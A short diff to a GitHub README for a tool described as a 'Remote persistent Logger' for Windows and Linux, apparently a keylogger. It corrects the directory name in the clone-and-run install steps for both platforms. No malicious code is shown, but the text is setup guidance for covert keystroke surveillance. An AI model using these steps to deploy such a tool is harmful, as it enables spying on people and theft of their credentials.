@@ -29,14 +29,14 @@ Remote persistent 🔑Logger for Windows and Linux
 
 ```bash
 git clone https://github.com/De3vil/KLogger.git
-cd SteaLinG
+cd KLogger
 pip install -r win_requirements.txt
 python logger.py
 ```
 ### Installation to Linux 
 ```bash
 git clone https://github.com/De3vil/KLogger.git
-cd SteaLinG
+cd KLogger
 chmod +x linux_setup.sh
 bash linux_setup.sh
 python logger.py
